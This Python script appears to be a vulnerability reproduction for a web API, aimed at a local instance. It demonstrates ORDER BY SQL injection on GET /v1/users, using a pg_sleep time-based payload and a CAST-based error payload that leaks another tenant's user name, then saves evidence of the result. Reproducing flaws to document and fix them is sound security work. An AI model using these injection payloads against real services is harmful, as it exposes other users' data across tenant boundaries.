#!/usr/bin/env python3
"""ORDER BY SQL injection on GET /v1/users for a self-registered user.

Prereq: web-api on $BASE (default http://127.0.0.1:3001), Postgres and Redis up.
"""
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BASE = os.environ.get("BASE", "http://127.0.0.1:3001")
HERE = Path(__file__).resolve().parent
EVIDENCE = HERE / "evidence"
EVIDENCE.mkdir(exist_ok=True)
PASSWORD = "Local-repro-1!"
LOG = []


def request(method, path, body=None, token=None, form=None):
    data = None
    headers = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=headers)
    started = time.perf_counter()
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        raw = resp.read()
        status = resp.status
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        status = exc.code
    elapsed = time.perf_counter() - started
    text = raw.decode("utf-8", "replace")
    entry = {
        "request": f"{method} {path}",
        "status": status,
        "elapsed_s": round(elapsed, 3),
        "body": text[:2000],
    }
    LOG.append(entry)
    return status, text, elapsed


def signup(email, first_name):
    status, text, _ = request(
        "POST",
        "/v1/signup",
        {
            "account": {
                "name": f"acct-{email}",
                "address1": "103 East Main St",
                "address2": "Unit 1",
                "city": "Valdez",
                "region": "AK",
                "country": "USA",
                "zipcode": "99686",
            },
            "user": {
                "first_name": first_name,
                "last_name": "Orderby",
                "email": email,
                "password": PASSWORD,
                "password_confirm": PASSWORD,
            },
        },
    )
    if status not in (200, 201):
        if "unique" not in text:
            raise SystemExit(f"signup {email} failed {status}: {text[:400]}")
        return None
    return json.loads(text)


def token_for(email):
    status, text, _ = request(
        "POST",
        "/v1/oauth/token",
        form={"username": email, "password": PASSWORD},
    )
    if status != 200:
        raise SystemExit(f"token {email} failed {status}: {text[:400]}")
    return json.loads(text)["access_token"]


def users(token, order):
    path = "/v1/users?order=" + urllib.parse.quote(order, safe="")
    return request("GET", path, token=token)


def main():
    attacker_email = "attacker-orderby@example.test"
    victim_email = "victim-orderby@example.test"
    victim_name = "VictimSecret"
    signup(attacker_email, "Attacker")
    signup(victim_email, victim_name)
    attacker = token_for(attacker_email)

    safe_status, safe_body, safe_elapsed = users(attacker, "email")
    # Both CASE branches are text. The sleep sits in the condition so Postgres
    # type-checks the expression, and pg_sleep runs once as an InitPlan.
    false_status, false_body, false_elapsed = users(
        attacker,
        "(CASE WHEN 1=0 THEN email ELSE email END)",
    )
    true_status, true_body, true_elapsed = users(
        attacker,
        "(CASE WHEN (SELECT 1 FROM pg_sleep(2))::int = 1 THEN email ELSE email END)",
    )
    leak_order = (
        f"(SELECT CAST(first_name AS integer) FROM users WHERE email='{victim_email}')"
    )
    leak_status, leak_body, _ = users(attacker, leak_order)

    summary = {
        "safe": {
            "status": safe_status,
            "elapsed_s": round(safe_elapsed, 3),
            "contains_attacker": attacker_email in safe_body,
            "contains_victim": victim_email in safe_body,
            "contains_victim_name": victim_name in safe_body,
        },
        "boolean_sleep_false": {
            "status": false_status,
            "elapsed_s": round(false_elapsed, 3),
        },
        "boolean_sleep_true": {
            "status": true_status,
            "elapsed_s": round(true_elapsed, 3),
        },
        "cross_tenant": {
            "status": leak_status,
            "victim_name_in_error": victim_name in leak_body,
            "victim_email_in_body": victim_email in leak_body,
        },
    }
    timing_ok = true_elapsed - false_elapsed >= 1.5 and true_status == 200 and false_status == 200
    leak_ok = leak_status >= 500 and victim_name in leak_body and victim_email not in safe_body
    safe_ok = safe_status == 200 and attacker_email in safe_body and victim_email not in safe_body
    summary["checks"] = {
        "tenant_filter": safe_ok,
        "time_based": timing_ok,
        "cross_tenant_error": leak_ok,
    }
    summary["reproduced"] = "yes" if safe_ok and timing_ok and leak_ok else "partial" if (timing_ok or leak_ok) else "no"

    (EVIDENCE / "summary.json").write_text(json.dumps(summary, indent=2))
    (EVIDENCE / "transcript.json").write_text(json.dumps(LOG, indent=2))
    print(json.dumps(summary, indent=2))
    if summary["reproduced"] != "yes":
        raise SystemExit(1)


if __name__ == "__main__":
    main()
